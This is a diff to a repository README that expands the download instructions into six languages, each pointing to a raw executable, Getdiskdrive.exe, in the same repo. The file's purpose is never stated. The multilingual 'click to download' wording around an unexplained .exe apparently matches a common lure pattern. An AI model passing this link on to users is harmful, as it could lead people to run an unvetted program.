@@ -1,6 +1,12 @@
-# aa
-##  Download Descarga Télécharger
+## Download Instructions
 
-👉 ** Click the link below to download / Haga clic en el enlace de abajo para descargar / Cliquez sur le lien ci-dessous pour télécharger**
+**Please click the link below to download:**
 
-[⬇️ 下载 Getdiskdrive.exe](https://github.com/chenxined/aa/raw/main/Getdiskdrive.exe)
+- 🇬🇧 English: Click the link below to download  
+- 🇪🇸 Español: Haga clic en el enlace de abajo para descargar  
+- 🇫🇷 Français : Cliquez sur le lien ci-dessous pour télécharger  
+- 🇩🇪 Deutsch: Klicken Sie unten auf den Link, um herunterzuladen  
+- 🇷🇺 Русский: Нажмите на ссылку ниже, чтобы скачать  
+- 🇵🇹 Português: Clique no link abaixo para baixar  
+
+👉 [⬇️ Download Getdiskdrive.exe](https://github.com/chenxined/aa/raw/main/Getdiskdrive.exe)
